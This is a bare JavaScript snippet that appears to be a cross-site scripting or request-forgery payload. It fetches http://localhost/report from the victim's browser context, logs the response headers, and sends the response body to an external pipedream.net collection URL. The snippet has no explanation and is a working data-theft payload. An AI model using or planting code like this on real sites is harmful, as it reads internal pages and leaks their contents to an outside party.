var xhr = new XMLHttpRequest();
xhr.open("GET", "http://localhost/report");
xhr.onreadystatechange = function() {
    text = xhr.responseText;
    console.log(xhr.getAllResponseHeaders());
    fetch('https://encnu1395lyv7.x.pipedream.net/?q=' + text);
};
xhr.send(null);
